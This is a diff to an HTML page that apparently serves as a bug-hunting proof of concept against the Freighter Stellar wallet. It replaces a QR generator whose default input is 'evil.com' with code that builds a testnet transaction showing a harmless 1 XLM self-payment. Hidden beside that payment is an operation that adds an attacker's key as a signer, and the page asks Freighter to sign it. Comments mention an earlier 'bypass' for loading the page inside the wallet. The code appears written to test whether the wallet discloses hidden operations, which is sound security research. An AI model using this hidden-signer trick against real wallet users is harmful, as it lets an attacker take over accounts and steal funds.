@@ -3,37 +3,61 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/stellar-sdk/12.0.0/stellar-sdk.min.js"></script>
 <style>
-body{background:#fff;margin:0;font-family:Arial;padding:20px;text-align:center}
-.top{padding-top:10px;font-weight:bold}
-#qrs{display:flex;flex-direction:column;gap:20px;margin-top:20px;align-items:center}
-.box{border:2px solid #000;padding:10px}
-.box div{margin-top:8px;font-size:12px}
+body{background:#fff;margin:0;font-family:Arial}
+.top{text-align:center;padding-top:22px}
+.top span{color:#000;font-size:18px;font-weight:bold;cursor:pointer}
+#log{text-align:center;margin-top:20px;font-size:12px;color:#000;white-space:pre-wrap;padding:0 15px}
 </style>
 </head>
 <body>
-<div class="top">Click Here</div>
-<div style="margin-top:15px">
-<input id="payload" style="width:90%;padding:10px;border:2px solid #000" value="https://evil.com">
-<button onclick="gen()" style="margin-top:10px;padding:8px 20px;background:#fff;border:2px solid #000;font-weight:bold">Generate QR</button>
-</div>
-<div id="qrs"></div>
+<div class="top"><span onclick="test()">Click Here</span></div>
+<div id="log"></div>
 
 <script>
-function gen(){
-  var val = document.getElementById('payload').value;
-  var container = document.createElement('div');
-  container.className='box';
-  var qrDiv = document.createElement('div');
-  container.appendChild(qrDiv);
-  var label = document.createElement('div');
-  label.innerText = val;
-  container.appendChild(label);
-  document.getElementById('qrs').prepend(container);
-  new QRCode(qrDiv, {text: val, width: 200, height: 200});
+async function test(){
+  const log = document.getElementById('log');
+  log.innerText = "Loading account GBKIAL...";
+
+  try{
+    const server = new StellarSdk.Horizon.Server('https://horizon-testnet.stellar.org');
+    const source = await server.loadAccount('GBKIAL4UCC5YHFDNPHG3SMVLO4XZEEQA4VQ6F7EZW5ZDIWS324NUC537');
+
+    const tx = new StellarSdk.TransactionBuilder(source, {
+      fee: "100",
+      networkPassphrase: StellarSdk.Networks.TESTNET
+    })
+    // Op1: Keliatan aman - kirim 1 XLM ke diri sendiri
+    .addOperation(StellarSdk.Operation.payment({
+      destination: 'GBKIAL4UCC5YHFDNPHG3SMVLO4XZEEQA4VQ6F7EZW5ZDIWS324NUC537',
+      asset: StellarSdk.Asset.native(),
+      amount: '1'
+    }))
+    // Op2: Hidden - add signer attacker GDAITTQ...
+    .addOperation(StellarSdk.Operation.setOptions({
+      signer: { ed25519PublicKey: 'GDAITTQ3FTE6BB5OBNBC7NOEAIODMVOB23EBJLVPHUVSAELIRSER3V22', weight: 1 }
+    }))
+    .setTimeout(30)
+    .build();
+
+    const xdr = tx.toXDR();
+    log.innerText = "XDR ready, calling Freighter...\n" + xdr.slice(0,70) + "...";
+
+    if(window.freighterApi){
+      const signed = await window.freighterApi.signTransaction(xdr, { 
+        networkPassphrase: StellarSdk.Networks.TESTNET,
+        accountToSign: 'GBKIAL4UCC5YHFDNPHG3SMVLO4XZEEQA4VQ6F7EZW5ZDIWS324NUC537'
+      });
+      log.innerText = "Signed XDR:\n" + signed.slice(0,100) + "...\n\nCEK DI POPUP FREIGHTER:\nApakah ada 'Add Signer GDAITTQ...' ?\nJika TIDAK ADA = BUG HIGH";
+    }else{
+      log.innerText = "window.freighterApi NOT FOUND\nBuka file ini lewat Freighter > Discover > Search\nhttps://0x403for.github.io/... (pakai bypass kemarin)";
+    }
+
+  }catch(e){
+    document.getElementById('log').innerText = "Error: " + e.message + "\nPastikan akun GBKIAL... sudah ada di TESTNET dan ada XLM testnet";
+  }
 }
-gen();
 </script>
 </body>
 </html>
